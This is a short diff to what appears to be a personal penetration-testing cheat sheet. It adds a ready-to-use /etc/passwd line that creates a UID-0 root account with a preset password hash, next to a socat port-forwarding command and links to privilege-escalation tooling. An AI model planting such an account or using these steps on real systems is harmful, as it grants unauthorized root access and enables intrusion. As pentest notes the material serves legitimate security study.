@@ -5,6 +5,7 @@ Just various bits of script and techniques I've found useful.
 - Socat expose port: `socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &`
 - Linpeas: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
 - Static binaries: https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
+- passwd user to add: user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash
 
 ## Reverse shells
 
